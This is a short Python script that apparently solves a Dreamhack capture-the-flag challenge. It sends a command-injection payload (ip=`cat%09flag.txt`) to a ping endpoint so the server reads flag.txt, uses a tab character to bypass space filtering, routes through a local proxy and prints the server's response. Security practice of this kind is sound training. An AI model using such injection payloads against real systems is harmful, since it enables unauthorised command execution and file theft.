from email import header

import requests
from bs4 import BeautifulSoup


url = 'http://host3.dreamhack.games:19027'

raw_payload = "ip=`cat%09flag.txt`"

header = {
    'Content-Type':'application/x-www-form-urlencoded'
}

proxies = {
    'http':'http://localhost:8080',
    'https':'http://localhost:8080'
}

req = requests.post(url=url + '/ping',
                    data=raw_payload,
                    headers=header,
                    proxies=proxies,
                    timeout=5)

print(BeautifulSoup(req.text, features='html.parser'))
